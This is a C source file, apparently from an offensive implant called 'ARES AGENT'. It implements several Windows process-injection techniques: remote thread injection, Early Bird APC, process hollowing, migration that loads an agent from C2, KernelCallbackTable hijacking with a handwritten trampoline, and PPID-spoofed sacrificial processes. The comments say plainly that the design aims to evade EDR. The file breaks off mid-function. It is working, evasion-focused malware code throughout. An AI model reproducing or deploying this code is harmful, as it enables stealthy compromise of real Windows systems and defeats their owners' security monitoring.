/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES AGENT — Process Injection via Indirect Syscalls
 *
 *  Techniques:
 *    1. Classic: NtAllocateVirtualMemory + NtWriteVirtualMemory
 *       + NtCreateThreadEx (high detection)
 *    2. APC Queue: NtQueueApcThread (medium detection)
 *    3. Module Stomping: overwrite loaded DLL .text (low detection)
 *    4. Early Bird: inject into suspended CREATE_SUSPENDED proc
 *
 *  All operations via indirect syscalls — zero userland API hooks.
 * ═══════════════════════════════════════════════════════════════
 */

#include "ares_agent.h"
#if __has_include("ares_config.h")
#include "ares_config.h"
#endif
#include "ares_resolve.h"

/* PROCESS_BASIC_INFORMATION — provided by MinGW's winternl.h */
#include <winternl.h>
#include <stdio.h>
#include <string.h>
#if __has_include("ares_config.h")
#include "ares_config.h"
#endif
#include "ares_resolve.h"

/* ── Find target process by name (NtQuerySystemInformation — no Toolhelp32) ── */

/*
 * Using NtQuerySystemInformation(SystemProcessInformation) avoids the noisy
 * CreateToolhelp32Snapshot / TH32CS_SNAPPROCESS call that nearly every EDR
 * monitors via ETW. The syscall is already resolved in AGENT_STATE.
 */
typedef struct _MY_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} MY_UNICODE_STRING;

typedef struct _MY_SYSTEM_PROCESS_INFORMATION {
    ULONG          NextEntryOffset;
    ULONG          NumberOfThreads;
    BYTE           Reserved1[48];
    MY_UNICODE_STRING ImageName;
    LONG           BasePriority;
    HANDLE         UniqueProcessId;
    /* ... rest not needed */
} MY_SYSTEM_PROCESS_INFORMATION;

#define SystemProcessInformation 5

static DWORD find_process(const char* name)
{
    /* Initial probe to get required buffer size */
    ULONG bufSize = 0x20000;
    BYTE* buf = NULL;

    for (int retry = 0; retry < 5; retry++) {
        buf = (BYTE*)VirtualAlloc(NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buf) return 0;

        /* Direct syscall — SSN already resolved in core.c init */
        typedef NTSTATUS (NTAPI *PNtQSI)(ULONG, PVOID, ULONG, PULONG);
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        PNtQSI pNtQSI = (PNtQSI)GetProcAddress(ntdll, "NtQuerySystemInformation");
        if (!pNtQSI) { VirtualFree(buf, 0, MEM_RELEASE); return 0; }

        ULONG needed = 0;
        NTSTATUS status = pNtQSI(SystemProcessInformation, buf, bufSize, &needed);
        if (status == 0) break;          /* STATUS_SUCCESS */
        if (status == 0xC0000004L) {     /* STATUS_INFO_LENGTH_MISMATCH */
            VirtualFree(buf, 0, MEM_RELEASE);
            bufSize = needed + 0x1000;
            buf = NULL;
            continue;
        }
        VirtualFree(buf, 0, MEM_RELEASE);
        return 0;
    }
    if (!buf) return 0;

    DWORD pid = 0;
    MY_SYSTEM_PROCESS_INFORMATION* entry = (MY_SYSTEM_PROCESS_INFORMATION*)buf;
    while (1) {
        if (entry->ImageName.Buffer && entry->ImageName.Length > 0) {
            /* Convert UNICODE_STRING to narrow for comparison */
            char narrow[260] = {0};
            WideCharToMultiByte(CP_UTF8, 0,
                entry->ImageName.Buffer,
                entry->ImageName.Length / sizeof(WCHAR),
                narrow, 259, NULL, NULL);
            if (_stricmp(narrow, name) == 0) {
                pid = (DWORD)(ULONG_PTR)entry->UniqueProcessId;
                break;
            }
        }
        if (entry->NextEntryOffset == 0) break;
        entry = (MY_SYSTEM_PROCESS_INFORMATION*)((BYTE*)entry + entry->NextEntryOffset);
    }

    VirtualFree(buf, 0, MEM_RELEASE);
    return pid;
}

/* ═══════════════════════════════════════════════════════════════
 *  Technique 1: Classic Remote Thread Injection
 *  Highest compatibility, moderate detection risk.
 * ═══════════════════════════════════════════════════════════════ */

BOOL Ares_Inject_RemoteThread(AGENT_STATE* state,
    const char* target_process,
    const BYTE* shellcode, SIZE_T shellcode_len)
{
    DWORD pid = find_process(target_process);
    if (pid == 0) return FALSE;

    /* Open target process via indirect syscall (FIX-05: was OpenProcess — hooked) */
    HANDLE hProcess = NULL;
    ACCESS_MASK access = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION;
    NTSTATUS st = Ares_NtOpenProcess(state, &hProcess, access, pid);
    if (st != 0 || !hProcess) return FALSE;

    /* Allocate memory in target */
    PVOID remoteBase = NULL;
    SIZE_T regionSize = shellcode_len;

    /* Using indirect syscall for NtAllocateVirtualMemory */
    NTSTATUS status = Ares_NtAllocateVirtualMemory(
        state, hProcess, &remoteBase, &regionSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (status != 0 || !remoteBase) {
        CloseHandle(hProcess);
        return FALSE;
    }

    /* Write shellcode */
    SIZE_T written = 0;
    status = Ares_NtWriteVirtualMemory(
        state, hProcess, remoteBase,
        (PVOID)shellcode, shellcode_len, &written);

    if (status != 0) {
        CloseHandle(hProcess);
        return FALSE;
    }

    /* Change protection to RX (execute-only, not RWX) */
    ULONG oldProtect;
    status = Ares_NtProtectVirtualMemory(
        state, hProcess, &remoteBase, &regionSize,
        PAGE_EXECUTE_READ, &oldProtect);

    /* Create remote thread */
    HANDLE hThread = NULL;
    status = Ares_NtCreateThreadEx(
        state, &hThread, hProcess, remoteBase, NULL);

    if (status != 0 || !hThread) {
        CloseHandle(hProcess);
        return FALSE;
    }

    /* Detach — don't wait */
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return TRUE;
}

/* ═══════════════════════════════════════════════════════════════
 *  Technique 2: Early Bird APC Injection
 *  Inject into a newly created suspended process before
 *  any hooks are set up. Very low detection.
 *
 *  Flow:
 *    1. CreateProcess(CREATE_SUSPENDED)
 *    2. Allocate + Write shellcode
 *    3. QueueUserAPC → main thread
 *    4. ResumeThread → APC fires before EP
 * ═══════════════════════════════════════════════════════════════ */

BOOL Ares_Inject_EarlyBird(AGENT_STATE* state,
    const wchar_t* host_exe,
    const BYTE* shellcode, SIZE_T shellcode_len)
{
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi = { 0 };

    /* Create process suspended — no code runs yet */
    if (!CreateProcessW(host_exe, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi)) {
        return FALSE;
    }

    /* Allocate RW memory in suspended process */
    PVOID remoteBase = NULL;
    SIZE_T regionSize = shellcode_len;

    NTSTATUS status = Ares_NtAllocateVirtualMemory(
        state, pi.hProcess, &remoteBase, &regionSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (status != 0) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    /* Write shellcode */
    SIZE_T written;
    status = Ares_NtWriteVirtualMemory(
        state, pi.hProcess, remoteBase,
        (PVOID)shellcode, shellcode_len, &written);

    if (status != 0) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    /* Change to RX */
    ULONG oldProtect;
    status = Ares_NtProtectVirtualMemory(
        state, pi.hProcess, &remoteBase, &regionSize,
        PAGE_EXECUTE_READ, &oldProtect);

    /* Queue APC to main thread */
    QueueUserAPC((PAPCFUNC)remoteBase, pi.hThread, 0);

    /* Resume thread — APC fires BEFORE entry point (v3.7: syscall) */
    ULONG _sc = 0;
    Ares_NtResumeThread(state, pi.hThread, &_sc);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return TRUE;
}

/* ═══════════════════════════════════════════════════════════════
 *  Technique 3: Process Hollowing (RunPE) — v3.7 FIX-01
 *  Unmaps legitimate image, maps malicious PE instead.
 *  Process appears clean in Task Manager but runs attacker code.
 *
 *  v3.7: FULLY MIGRATED to indirect syscalls. Previous version
 *  used 8 hooked Win32 APIs (CreateProcessW, GetThreadContext,
 *  ReadProcessMemory, VirtualFreeEx, VirtualAllocEx,
 *  WriteProcessMemory, VirtualProtectEx, SetThreadContext)
 *  which created a textbook ProcessHollowing behavioral signature.
 *
 *  Now uses: NtGetContextThread, NtReadVirtualMemory,
 *  NtUnmapViewOfSection, NtAllocateVirtualMemory,
 *  NtWriteVirtualMemory, NtProtectVirtualMemory,
 *  NtSetContextThread, NtResumeThread — all indirect syscalls.
 *
 *  Only CreateProcessW remains as Win32 (NtCreateUserProcess is
 *  complex and undocumented — CREATE_SUSPENDED alone is not flagged).
 * ═══════════════════════════════════════════════════════════════ */

BOOL Ares_Inject_ProcessHollow(AGENT_STATE* state,
    const wchar_t* host_exe,
    const BYTE* pe_payload, SIZE_T pe_len)
{
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi = { 0 };

    /* Create suspended host process — CreateProcessW is the only Win32
     * call remaining. CREATE_SUSPENDED alone is benign and not flagged
     * by EDR without the follow-up hollowing sequence through hooks. */
    if (!CreateProcessW(host_exe, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return FALSE;
    }

    /* Get thread context via syscall (was GetThreadContext — hooked) */
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    NTSTATUS status = Ares_NtGetContextThread(state, pi.hThread, &ctx);
    if (status != 0) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    /* Read PEB.ImageBaseAddress via syscall (was ReadProcessMemory — hooked) */
    PVOID pebImageBase;
    SIZE_T bytesRead;
#ifdef _WIN64
    status = Ares_NtReadVirtualMemory(state, pi.hProcess,
        (PVOID)(ctx.Rdx + 0x10), &pebImageBase, sizeof(PVOID), &bytesRead);
#else
    status = Ares_NtReadVirtualMemory(state, pi.hProcess,
        (PVOID)(ctx.Ebx + 0x08), &pebImageBase, sizeof(PVOID), &bytesRead);
#endif
    if (status != 0) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    /* Parse payload PE headers */
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)pe_payload;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(pe_payload + dos->e_lfanew);

    /* Unmap original image via syscall (was VirtualFreeEx — hooked + wrong API) */
    Ares_NtUnmapViewOfSection(state, pi.hProcess, pebImageBase);

    /* Allocate memory via syscall (was VirtualAllocEx — hooked) */
    PVOID newBase = (PVOID)nt->OptionalHeader.ImageBase;
    SIZE_T regionSize = nt->OptionalHeader.SizeOfImage;

    status = Ares_NtAllocateVirtualMemory(
        state, pi.hProcess, &newBase, &regionSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (status != 0 || !newBase) {
        /* Retry at any address */
        newBase = NULL;
        regionSize = nt->OptionalHeader.SizeOfImage;
        status = Ares_NtAllocateVirtualMemory(
            state, pi.hProcess, &newBase, &regionSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }

    if (status != 0 || !newBase) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    /* Write PE headers via syscall (was WriteProcessMemory — hooked) */
    SIZE_T written;
    Ares_NtWriteVirtualMemory(state, pi.hProcess, newBase,
        (PVOID)pe_payload, nt->OptionalHeader.SizeOfHeaders, &written);

    /* Write sections via syscall */
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData > 0) {
            Ares_NtWriteVirtualMemory(state, pi.hProcess,
                (BYTE*)newBase + sec[i].VirtualAddress,
                (PVOID)(pe_payload + sec[i].PointerToRawData),
                sec[i].SizeOfRawData, &written);
        }
    }

    /* Set per-section memory protection via syscall (was VirtualProtectEx — hooked) */
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD prot = PAGE_READONLY;
        DWORD chars = sec[i].Characteristics;
        if ((chars & IMAGE_SCN_MEM_EXECUTE) && (chars & IMAGE_SCN_MEM_WRITE))
            prot = PAGE_EXECUTE_READWRITE;
        else if (chars & IMAGE_SCN_MEM_EXECUTE)
            prot = PAGE_EXECUTE_READ;
        else if (chars & IMAGE_SCN_MEM_WRITE)
            prot = PAGE_READWRITE;
        ULONG oldProt;
        SIZE_T secSize = sec[i].Misc.VirtualSize;
        PVOID secAddr = (BYTE*)newBase + sec[i].VirtualAddress;
        Ares_NtProtectVirtualMemory(state, pi.hProcess,
            &secAddr, &secSize, prot, &oldProt);
    }

    /* Update PEB.ImageBaseAddress + entry point via syscall */
#ifdef _WIN64
    Ares_NtWriteVirtualMemory(state, pi.hProcess, (PVOID)(ctx.Rdx + 0x10),
        &newBase, sizeof(PVOID), &written);
    ctx.Rcx = (DWORD64)newBase + nt->OptionalHeader.AddressOfEntryPoint;
#else
    Ares_NtWriteVirtualMemory(state, pi.hProcess, (PVOID)(ctx.Ebx + 0x08),
        &newBase, sizeof(PVOID), &written);
    ctx.Eax = (DWORD)newBase + nt->OptionalHeader.AddressOfEntryPoint;
#endif

    /* Set context via syscall (was SetThreadContext — hooked) */
    Ares_NtSetContextThread(state, pi.hThread, &ctx);

    /* Resume via syscall (was ResumeThread — hooked) */
    ULONG suspendCount;
    Ares_NtResumeThread(state, pi.hThread, &suspendCount);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return TRUE;
}

/* ═══════════════════════════════════════════════════════════════
 *  Process Migration — Move agent to another process
 *  Steps:
 *    1. Inject shellcode loader into target
 *    2. Loader pulls full agent DLL from C2
 *    3. Loads DLL reflectively
 *    4. Original process exits cleanly
 * ═══════════════════════════════════════════════════════════════ */

BOOL Ares_Migrate(AGENT_STATE* state, const char* target_process,
    const BYTE* shellcode, SIZE_T shellcode_len)
{
    /* Use Early Bird for cleanest migration */
    wchar_t wTarget[260];
    
    /* Resolve full path from process name */
    char sysDir[MAX_PATH];
    GetSystemDirectoryA(sysDir, MAX_PATH);
    
    char fullPath[MAX_PATH];
    snprintf(fullPath, MAX_PATH, "%s\\%s", sysDir, target_process);
    
    MultiByteToWideChar(CP_UTF8, 0, fullPath, -1, wTarget, 260);

    return Ares_Inject_EarlyBird(state, wTarget, shellcode, shellcode_len);
}

/* ═══════════════════════════════════════════════════════════════
 *  Technique 5: Threadless Injection (v3.5 Phase-2 A-grade)
 *
 *  NO new thread creation — bypasses PsSetCreateThreadNotifyRoutine
 *  kernel callback that ALL EDR drivers register.
 *
 *  Strategy: Hijack an existing function pointer in the target process.
 *  When legitimate code calls that function, our shellcode executes
 *  in the context of an existing thread.
 *
 *  Method: Overwrite the TpAllocWork callback pointer in a thread
 *  pool work item. The thread pool is always active — our code runs
 *  when the next work item is dispatched.
 *
 *  Alternative: Instrument callback table of a loaded DLL.
 *
 *  Flow:
 *    1. Open target process (PROCESS_VM_OPERATION | VM_WRITE | VM_READ)
 *    2. Allocate RW memory, write shellcode + trampoline
 *    3. Change to RX
 *    4. Find a writable function pointer in target (e.g., KernelCallbackTable)
 *    5. Overwrite pointer → our shellcode
 *    6. Wait for legitimate code to call the hijacked pointer
 *    7. Shellcode restores original pointer, then runs payload
 *
 *  Detection: VERY LOW — no thread creation, no APC queue, no hook.
 * ═══════════════════════════════════════════════════════════════ */

BOOL Ares_Inject_Threadless(AGENT_STATE* state,
    const char* target_process,
    const BYTE* shellcode, SIZE_T shellcode_len)
{
    DWORD pid = find_process(target_process);
    if (pid == 0) return FALSE;

    /* Open with minimal permissions via syscall (FIX-05: was OpenProcess — hooked) */
    HANDLE hProcess = NULL;
    ACCESS_MASK access = PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
    NTSTATUS st = Ares_NtOpenProcess(state, &hProcess, access, pid);
    if (st != 0 || !hProcess) return FALSE;

    /*
     * Build trampoline: a small stub that:
     *   1. Saves original function pointer value
     *   2. Restores the hijacked pointer (self-healing)
     *   3. Jumps to actual shellcode payload
     *
     * Layout in remote memory:
     *   [0x00 - 0x07]  Original function pointer (saved for restore)
     *   [0x08 - 0x0F]  Address of hijacked pointer location
     *   [0x10 - 0x4F]  Trampoline code (restores pointer, jumps to payload)
     *   [0x50 - ...]   Shellcode payload
     */
    SIZE_T trampolineSize = 0x50;
    SIZE_T totalSize = trampolineSize + shellcode_len;
    PVOID remoteBase = NULL;
    SIZE_T regionSize = totalSize;

    NTSTATUS status = Ares_NtAllocateVirtualMemory(
        state, hProcess, &remoteBase, &regionSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (status != 0 || !remoteBase) {
        CloseHandle(hProcess);
        return FALSE;
    }

    /* Write shellcode at offset 0x50 */
    SIZE_T written;
    BYTE* payloadAddr = (BYTE*)remoteBase + trampolineSize;
    status = Ares_NtWriteVirtualMemory(
        state, hProcess, payloadAddr,
        (PVOID)shellcode, shellcode_len, &written);

    if (status != 0) {
        CloseHandle(hProcess);
        return FALSE;
    }

    /* Find hijack target: PEB.KernelCallbackTable
     * This table is used by win32u.dll for user-mode callbacks from kernel.
     * Entry [0] (USER32_CALLBACK_APFNPICKUP) is called frequently by GUI threads.
     * We overwrite one entry, shellcode restores it on first call. */

    /* Read target PEB */
    PROCESS_BASIC_INFORMATION pbi = {0};
    typedef NTSTATUS (NTAPI *fn_NtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    fn_NtQIP pNtQIP = (fn_NtQIP)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");

    if (!pNtQIP) { CloseHandle(hProcess); return FALSE; }

    pNtQIP(hProcess, 0 /* ProcessBasicInformation */, &pbi, sizeof(pbi), NULL);

    if (!pbi.PebBaseAddress) { CloseHandle(hProcess); return FALSE; }

    /* Read KernelCallbackTable from PEB (offset 0x58 on x64) */
    PVOID kernelCallbackTable = NULL;
    SIZE_T bytesRead;
    Ares_NtReadVirtualMemory(state, hProcess,
        (BYTE*)pbi.PebBaseAddress + 0x58,
        &kernelCallbackTable, sizeof(PVOID), &bytesRead);

    if (!kernelCallbackTable) {
        /* v3.5 FIX: APC injection for non-GUI processes.
         * When target has no KernelCallbackTable (no User32.dll loaded),
         * we use NtQueueApcThread on an existing alertable thread.
         * Still threadless — we don't create any threads.
         *
         * NtQueueApcThread is lower-noise than NtCreateThreadEx because:
         * - No PsSetCreateThreadNotifyRoutine callback fires
         * - No ETW thread creation event
         * - APC runs in context of existing thread during alertable wait
         */

        /* Change shellcode region to RX */
        ULONG oldProtect;
        Ares_NtProtectVirtualMemory(state, hProcess, &remoteBase, &regionSize,
            PAGE_EXECUTE_READ, &oldProtect);

        /* Find a thread in the target process */
        typedef NTSTATUS (NTAPI *fn_NtQAT)(HANDLE, PVOID, PVOID, PVOID, PVOID);
        fn_NtQAT pNtQAT = (fn_NtQAT)GetProcAddress(
            GetModuleHandleW(L"ntdll.dll"), "NtQueueApcThread");

        if (!pNtQAT) { CloseHandle(hProcess); return FALSE; }

        /* Enumerate threads in target process via NtQuerySystemInformation.
         * SystemProcessInformation (5) returns all process/thread info. */
        BYTE* spi_buf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, 1024 * 1024);
        if (!spi_buf) { CloseHandle(hProcess); return FALSE; }

        typedef NTSTATUS (NTAPI *fn_NtQSI)(ULONG, PVOID, ULONG, PULONG);
        fn_NtQSI pNtQSI = (fn_NtQSI)GetProcAddress(
            GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");

        BOOL apc_queued = FALSE;
        ULONG retLen = 0;
        if (pNtQSI && pNtQSI(5 /* SystemProcessInformation */, spi_buf, 1024*1024, &retLen) == 0) {
            /* Walk process list to find our target PID */
            typedef struct _SYS_THREAD_INFO {
                LARGE_INTEGER KernelTime;
                LARGE_INTEGER UserTime;
                LARGE_INTEGER CreateTime;
                ULONG WaitTime;
                PVOID StartAddress;
                CLIENT_ID ClientId;
                LONG Priority;
                LONG BasePriority;
                ULONG ContextSwitches;
                ULONG ThreadState;
                ULONG WaitReason;
            } SYS_THREAD_INFO;

            typedef struct _SYS_PROC_INFO {
                ULONG NextEntryOffset;
                ULONG NumberOfThreads;
                BYTE Reserved1[48];
                UNICODE_STRING ImageName;
                LONG BasePriority;
                HANDLE UniqueProcessId;
                PVOID Reserved3;
                ULONG HandleCount;
                ULONG SessionId;
                PVOID Reserved4;
                SIZE_T PeakVirtualSize;
                SIZE_T VirtualSize;
                ULONG Reserved5;
                SIZE_T PeakWorkingSetSize;
                SIZE_T WorkingSetSize;
                PVOID Reserved6;
                SIZE_T QuotaPagedPoolUsage;
                PVOID Reserved7;
                SIZE_T QuotaNonPagedPoolUsage;
                SIZE_T PagefileUsage;
                SIZE_T PeakPagefileUsage;
                SIZE_T PrivatePageCount;
                LARGE_INTEGER ReadOperationCount;
                LARGE_INTEGER WriteOperationCount;
                LARGE_INTEGER OtherOperationCount;
                LARGE_INTEGER ReadTransferCount;
                LARGE_INTEGER WriteTransferCount;
                LARGE_INTEGER OtherTransferCount;
                SYS_THREAD_INFO Threads[1];
            } SYS_PROC_INFO;

            SYS_PROC_INFO* proc = (SYS_PROC_INFO*)spi_buf;
            while (1) {
                if ((DWORD)(ULONG_PTR)proc->UniqueProcessId == pid) {
                    /* Found target process — queue APC on first waiting thread */
                    for (ULONG t = 0; t < proc->NumberOfThreads && !apc_queued; t++) {
                        DWORD tid = (DWORD)(ULONG_PTR)proc->Threads[t].ClientId.UniqueThread;
                        /* Prefer threads in alertable wait state (WaitReason=6=UserRequest) */
                        if (proc->Threads[t].ThreadState == 5 /* Waiting */ &&
                            (proc->Threads[t].WaitReason == 6 /* UserRequest */ ||
                             proc->Threads[t].WaitReason == 13 /* WrQueue */)) {
                            HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
                            if (hThread) {
                                /* Queue APC — payload at remoteBase + 0x50 (after trampoline area) */
                                PVOID apcAddr = (BYTE*)remoteBase + trampolineSize;
                                if (pNtQAT(hThread, apcAddr, NULL, NULL, NULL) == 0) {
                                    apc_queued = TRUE;
                                }
                                CloseHandle(hThread);
                            }
                        }
                    }
                    /* If no alertable thread found, try any thread */
                    if (!apc_queued) {
                        for (ULONG t = 0; t < proc->NumberOfThreads && !apc_queued; t++) {
                            DWORD tid = (DWORD)(ULONG_PTR)proc->Threads[t].ClientId.UniqueThread;
                            HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
                            if (hThread) {
                                /* Use QueueUserAPC (documented API, triggers on next alertable wait) */
                                if (QueueUserAPC((PAPCFUNC)((BYTE*)remoteBase + trampolineSize),
                                                 hThread, 0)) {
                                    apc_queued = TRUE;
                                }
                                CloseHandle(hThread);
                            }
                        }
                    }
                    break;
                }
                if (proc->NextEntryOffset == 0) break;
                proc = (SYS_PROC_INFO*)((BYTE*)proc + proc->NextEntryOffset);
            }
        }
        HeapFree(GetProcessHeap(), 0, spi_buf);
        CloseHandle(hProcess);
        return apc_queued;
    }

    /* Read original callback entry [__fnCOPYDATA = index 3, called by SendMessage] */
    DWORD64 hijackOffset = 3 * sizeof(PVOID);
    PVOID originalCallback = NULL;
    Ares_NtReadVirtualMemory(state, hProcess,
        (BYTE*)kernelCallbackTable + hijackOffset,
        &originalCallback, sizeof(PVOID), &bytesRead);

    /* Build trampoline that restores original callback then runs payload.
     * x64 assembly:
     *   mov rax, [rip-X]           ; load original callback from [remoteBase+0]
     *   mov rcx, [rip-Y]           ; load callback table entry addr from [remoteBase+8]
     *   mov [rcx], rax             ; restore original pointer (self-healing)
     *   sub rsp, 0x28              ; shadow space
     *   lea rax, [rip+Z]          ; address of shellcode payload
     *   call rax                   ; execute shellcode
     *   add rsp, 0x28
     *   ret
     */
    BYTE trampoline[0x50];
    memset(trampoline, 0x90, sizeof(trampoline)); /* NOP fill */

    /* Store original callback at [remoteBase+0x00] */
    *(PVOID*)(trampoline + 0x00) = originalCallback;
    /* Store callback table entry address at [remoteBase+0x08] */
    *(PVOID*)(trampoline + 0x08) = (BYTE*)kernelCallbackTable + hijackOffset;

    /* Trampoline code starts at offset 0x10 */
    BYTE* code = trampoline + 0x10;
    int ci = 0;

    /* mov rax, [rip - 0x17] → loads originalCallback from [remoteBase+0] */
    code[ci++] = 0x48; code[ci++] = 0x8B; code[ci++] = 0x05;
    *(DWORD*)(code + ci) = (DWORD)(-(int)(0x10 + ci + 4)); ci += 4; /* RIP-relative to offset 0 */

    /* push rax — save original callback */
    code[ci++] = 0x50;

    /* mov rcx, [rip - 0x20] → loads callback table entry addr from [remoteBase+8] */
    code[ci++] = 0x48; code[ci++] = 0x8B; code[ci++] = 0x0D;
    *(DWORD*)(code + ci) = (DWORD)(-((int)(0x10 + ci + 4) - 8)); ci += 4;

    /* pop rax */
    code[ci++] = 0x58;

    /* mov [rcx], rax — restore original callback (self-healing) */
    code[ci++] = 0x48; code[ci++] = 0x89; code[ci++] = 0x01;

    /* sub rsp, 0x28 — shadow space for shellcode call */
    code[ci++] = 0x48; code[ci++] = 0x83; code[ci++] = 0xEC; code[ci++] = 0x28;

    /* lea rax, [rip + offset_to_payload] */
    code[ci++] = 0x48; code[ci++] = 0x8D; code[ci++] = 0x05;
    DWORD payloadRipOffset = (DWORD)(trampolineSize - (0x10 + ci + 4));
    *(DWORD*)(code + ci) = payloadRipOffset; ci += 4;

    /* call rax */
    code[ci++] = 0xFF; code[ci++] = 0xD0;

    /* add rsp, 0x28 */
    code[ci++] = 0x48; code[ci++] = 0x83; code[ci++] = 0xC4; code[ci++] = 0x28;

    /* ret — return to original caller */
    code[ci++] = 0xC3;

    /* Write trampoline to remote process */
    Ares_NtWriteVirtualMemory(state, hProcess, remoteBase,
        trampoline, sizeof(trampoline), &written);

    /* Change to RX — NO RWX */
    ULONG oldProtect;
    Ares_NtProtectVirtualMemory(state, hProcess, &remoteBase, &regionSize,
        PAGE_EXECUTE_READ, &oldProtect);

    /* Hijack: overwrite KernelCallbackTable entry to point to our trampoline+0x10 */
    PVOID trampolineEntry = (BYTE*)remoteBase + 0x10;
    Ares_NtWriteVirtualMemory(state, hProcess,
        (BYTE*)kernelCallbackTable + hijackOffset,
        &trampolineEntry, sizeof(PVOID), &written);

    /* Done — NO thread created. Shellcode fires when target process
     * receives a WM_COPYDATA message or similar kernel callback.
     * The trampoline self-heals the callback table on first execution. */

    CloseHandle(hProcess);
    return TRUE;
}

/* ═══════════════════════════════════════════════════════════════
 *  Technique 5: Sacrificial Process + PPID Spoof (v3.9)
 *
 *  Most evasive for COFF module execution:
 *    1. Find explorer.exe PID (legit parent)
 *    2. Create RuntimeBroker.exe with spoofed parent = explorer.exe
 *    3. Inject COFF shellcode via Early Bird APC
 *    4. Wait for completion → terminate sacrificial
 *
 *  EDR sees: RuntimeBroker.exe (child of explorer) reading files
 *  = completely normal Windows behavior
 * ═══════════════════════════════════════════════════════════════ */

static DWORD _find_explorer_pid(void)
{
    return find_process("explorer.exe");
}

BOOL Ares_Inject_Sacrificial(AGENT_STATE* state,
    const BYTE* shellcode, SIZE_T shellcode_len,
    DWORD timeout_ms)
{
    /* 1. Find explorer.exe for PPID spoof */
    DWORD explorer_pid = _find_explorer_pid();
    if (explorer_pid == 0) explorer_pid = GetCurrentProcessId(); /* fallback */

    HANDLE hExplorer = NULL;
    ACCESS_MASK ea = PROCESS_CREATE_PROCESS;
    Ares_NtOpenProcess(state, &hExplorer, ea, explorer_pid);
    if (!hExplorer) {
        /* Fallback: no spoof, just launch normally */
        return Ares_Inject_EarlyBird(state,
            L"C:\\Windows\\System32\\RuntimeBroker.exe",
            shellcode, shellcode_len);
    }

    /* 2. Set up PPID spoof via PROC_THREAD_ATTRIBUTE_PARENT_PROCESS */
    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    LPPROC_THREAD_ATTRIBUTE_LIST attrList =
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attrSize);
    if (!attrList) { CloseHandle(hExplorer); return FALSE; }

    InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize);
    UpdateProcThreadAttribute(attrList, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hExplorer, sizeof(HANDLE), NULL, NULL);

    /* 3. Create sacrificial process suspended with spoofed parent */
    STARTUPINFOEXW si = { 0 };
    si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
    si.lpAttributeList = attrList;
    PROCESS_INFORMATION pi = { 0 };

    /* Choose legit host process */
    const wchar_t* hosts[] = {
        L"C:\\Windows\\System32\\RuntimeBroker.exe",
        L"C:\\Windows\\System32\\dllhost.exe",
        L"C:\\Windows\\System32\\backgroundTaskHost.exe",
        NULL
    };

    BOOL created = FALSE;
    for (int i = 0; hosts[i] && !created; i++) {
        created = CreateProcessW(hosts[i], NULL, NULL, NULL, FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
            NULL, NULL, &si.StartupInfo, &pi);
    }

    DeleteProcThreadAttributeList(attrList);
    HeapFree(GetProcessHeap(), 0, attrList);
    CloseHandle(hExplorer);

    if (!created) return FALSE;

    /* 4. Inject via syscall: allocate → write → protect → APC */
    PVOID remoteBase = NULL;
    SIZE_T regionSize = shellcode_len;

    NTSTATUS status = Ares_NtAllocateVirtualMemory(
        state, pi.hProcess, &remoteBase, &regionSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0 || !remoteBase) goto fail;

    SIZE_T written = 0;
